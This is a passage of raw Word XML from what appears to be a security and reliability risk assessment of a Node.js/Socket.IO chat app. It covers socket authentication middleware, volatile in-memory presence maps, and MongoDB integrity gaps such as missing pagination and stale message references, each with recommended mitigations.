              <w:t>Add socket-level authorization checks for room-specific events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1D1DB63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ADA694A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B3A3A5D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="73DDDC5F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lastRenderedPageBreak/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Recommended Socket.IO authentication middleware:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>io.use(async (socket, next) =&gt; {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    const token = socket.handshake.auth.token;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    if (!token) return next(new Error("Authentication required"));</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    try {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        const decoded = jwt.verify(token, process.env.JWT_SECRET);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        socket.userId = decoded.id;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        next();</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    } catch (err) {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        next(new Error("Invalid token"));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});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215C1981" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc240065718"/>
      <w:r>
        <w:t>4. Risk Area 3: In-Memory State Volatility</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="654B4067" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity: 🟡 MEDIUM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F2A7C2" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc240065719"/>
      <w:r>
        <w:t>4.1 Identification</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
    </w:p>
    <w:p w14:paraId="021A6604" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The system's real-time presence tracking relies entirely on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>volatile in-memory data structures</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that are lost upon server restart, crash, or deployment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C86532" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc240065720"/>
      <w:r>
        <w:t>4.2 Evidence</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="27DEFC6B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server.js, lines 81-83:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>const onlineUsers = new Map();      // Lost on server restart</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>const socketToUser = new Map();     // Lost on server restart</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>const socketAwayMap = new Map();    // Lost on server restart</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308669C4" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">These three Map objects constitute the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>single source of truth</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for: - Which users are currently online - Which socket connections belong to which users - Which tabs/sockets are in an "away" state</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F945653" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc240065721"/>
      <w:r>
        <w:t>4.3 Threat Scenario</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w14:paraId="68C08AFD" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. Server crashes due to an unhandled exception or is restarted for deployment. 2. All three Maps are instantiated as empty objects. 3. All currently connected users are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>immediately considered offline</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> by the server, even though their browser tabs remain open. 4. Status change broadcasts (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>user status change: offline</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>not sent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> because the server has no record of the previous connections. 5. Other users see stale presence data until the affected users refresh their pages and trigger new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> events. 6. The database retains the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>last known status</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from before the crash, which may be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>online</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>away</w:t>
      </w:r>
      <w:r>
        <w:t>, creating an inconsistency between database and server state.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA0E7C6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc240065722"/>
      <w:r>
        <w:t>4.4 Impact Assessment</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/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B2F5B" w14:paraId="741C2DD2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60E864EE" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Impact Factor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4E74DBAC" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="432B7BFB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816D768" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Data Loss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52B661" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>None (messages are persisted in MongoDB)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="16151348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64036BB" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>User Experience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8808904" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Degraded (stale presence, phantom "online" users)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="652028E5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9166CE" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Recovery Time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21C8C7" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Automatic (users reconnect on next page interaction)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="16012391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DCDD8A6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Frequency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CFD21A8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low (server crashes are infrequent in development)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="44BE3D21" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="513BF174" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc240065723"/>
      <w:r>
        <w:t>4.5 Current Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="03AAE083" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- Socket.IO clients automatically attempt to reconnect when a connection is lost, which triggers a new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> event and repopulates the presence registry. - The database </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>status</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> field is updated asynchronously, providing a fallback for presence queries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D73AE3F" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc240065724"/>
      <w:r>
        <w:t>4.6 Recommended Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/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B2F5B" w14:paraId="511869FF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69F08A9D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000"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4C02A02C" w14:textId="77777777" w:rsidR="00CB2F5B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1BC78A7C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="1D794C84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A74942" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Migrate presence data to Redis with TTL-based auto-expiry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B238DA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C3BCECB" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CB2F5B" w14:paraId="20528A1D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17926B7" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Implement graceful shutdown handler to broadcast </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>offline</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> for all users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FCF0E40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356289F0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0C97D7BF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8950C8" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Add client-side reconnection logic that re-emits </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>setup</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> on reconnect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3ECBEC1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C5ED17F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504D4CF9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383C6F5D" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement periodic presence heartbeat to detect and clean stale entries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1890660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0C63E36" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="408ECA01" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00CB2F5B"/>
    <w:p w14:paraId="40E855EA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul2"/>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc240065725"/>
      <w:r>
        <w:t>5. Risk Area 4: Data Integrity &amp; Consistency Constraints</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="2C34CBC6" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity: 🟡 MEDIUM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007A35A3" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc240065726"/>
      <w:r>
        <w:t>5.1 Identification</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="6B68655C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Several critical data integrity invariants are enforced at the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>application level</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> rather than at the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>database schema level</w:t>
      </w:r>
      <w:r>
        <w:t>, making them vulnerable to bypass through direct database manipulation, bugs, or incomplete error handling.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F056EA4" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc240065727"/>
      <w:r>
        <w:t>5.2 Evidence</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="2E723E1B" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability A — `readBy ⊆ deliveredTo` Invariant Not Schema-Enforced:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC551F2" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The system design specifies that a message can only be in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>readBy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> set if it is also in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>deliveredTo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> set (a message cannot be read before being delivered). However, this invariant is enforced only through application logic:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE59D55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messageControllers.js — Application-level enforcement:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>$addToSet: {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    readBy: userId,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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    deliveredTo: userId,    // Always updated together</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D1BFCA" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The MongoDB schema itself has </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>no constraint</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> preventing a direct database operation from adding a userId to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>readBy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> without also adding it to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>deliveredTo</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B7703D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messageModel.js — No cross-field validation:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>deliveredTo: [{ type: mongoose.Schema.Types.ObjectId, ref: "User" }],</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>readBy: [{ type: mongoose.Schema.Types.ObjectId, ref: "User" }],</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>// No schema-level validator ensures readBy ⊆ deliveredTo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3359B56B" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability B — No Message Pagination:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13919ADF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messageControllers.js, lines 11-17:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>const messages = await Message.find({</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    chat: req.params.chatId,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    deletedFor: { $ne: req.user._id },</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>})</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    .populate("sender", "name pic username")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    .populate("chat");</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>res.json(messages);   // Returns ALL messages — no limit, no pagination</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53EF1E0C" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This query returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>every message</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in a chat without any </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>skip</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> parameter. For a group chat with 100,000 messages, this results in: - Extremely large MongoDB query result sets consuming server memory - Multi-megabyte JSON response payloads transmitted over the network - Browser UI freezing or crashing when rendering tens of thousands of DOM elements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1760A5AD" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability C — `latestMessage` Reference Staleness:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C0A63A" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Chat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model maintains a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>latestMessage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> field that references the most recent message. This field is updated in multiple places (send message, delete message, clear chat), creating potential for inconsistency if one update path fails:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B5EABF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chatModel.js:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>latestMessage: { type: mongoose.Schema.Types.ObjectId, ref: "Message" }</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>// This is a denormalized reference that can become stale if the referenced message is deleted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFB559E" w14:textId="77777777" w:rsidR="00CB2F5B" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Judul3"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc240065728"/>
